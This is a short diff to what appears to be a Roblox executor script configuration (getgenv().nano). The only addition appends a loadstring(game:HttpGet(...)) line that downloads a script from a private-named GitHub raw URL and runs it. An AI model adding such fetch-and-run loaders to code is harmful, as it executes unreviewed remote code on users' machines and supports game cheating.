@@ -54,3 +54,5 @@ getgenv().nano = {
         },
     },
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xaxaxaxaxaxaxaxaxaxaxaxax/private/main/main.lua"))()
